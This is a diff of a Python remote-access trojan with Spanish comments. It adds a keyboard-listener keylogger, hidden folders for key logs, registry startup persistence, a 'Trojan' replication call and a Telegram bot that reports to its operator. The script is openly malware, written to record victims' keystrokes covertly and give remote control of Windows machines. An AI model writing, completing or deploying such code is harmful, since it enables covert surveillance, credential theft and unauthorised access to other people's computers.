@@ -14,6 +14,8 @@ import os
 import socket
 import string
 import time                             # Pausar script por segundos predeterminados
+import threading
+from pynput.keyboard import Listener            # Escucha eventos del teclado
 from random import random
 from winreg import OpenKey, HKEY_LOCAL_MACHINE, KEY_ALL_ACCESS, REG_SZ, SetValueEx, HKEY_CURRENT_USER
 
@@ -98,6 +100,18 @@ class Util:
                 registry = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)  # local
                 SetValueEx(registry, Config().NAME_REG, 0, REG_SZ, Config().PATH_KEY)
                 print("[StartUp] USER - EXITOSO")
+
+    def CreateFolders(self):  # Crea el directorio oculto
+        try:  # Intenta crear la dirección
+            os.makedirs(Config().PATH_HIDDEN_KEY)
+            print("[CreateFolders] - Exito al crear la ruta: " + Config().PATH_HIDDEN_KEY)
+        except:
+            print("[CreateFolders] - La carpeta ya existe: " + Config().PATH_HIDDEN_KEY)
+        try:  # Intenta crear la dirección del registro de teclas..
+            os.makedirs(Config().PATH_HIDDEN_LOG)
+            print("[CreateFolders] - Exito al crear la ruta: " + Config().PATH_KEY)
+        except:
+            print("[CreateFolders] - La carpeta ya existe: " + Config().PATH_KEY)
 
 
 class Keylogger:
@@ -375,10 +389,13 @@ def handle(msg):
 # Starting Script
 if __name__ == '__main__':
     print("[RAT] Start")
+    # Keylogger
+    print("[Keylogger] start...")
+    Util().Trojan()  # Reply system
+    Util().addStartUp()  # Added in Startup
 
     # Instancia configuración
     TB = Config()
-
     # Instancia Bot con Token
     bot = telepot.Bot(TB.TelegramBot().TOKEN)
     bot.sendMessage(TB.TelegramBot().ID, "Usted está en linea ...")
@@ -393,3 +410,5 @@ if __name__ == '__main__':
         time.sleep(10)
 
 
+
+print()
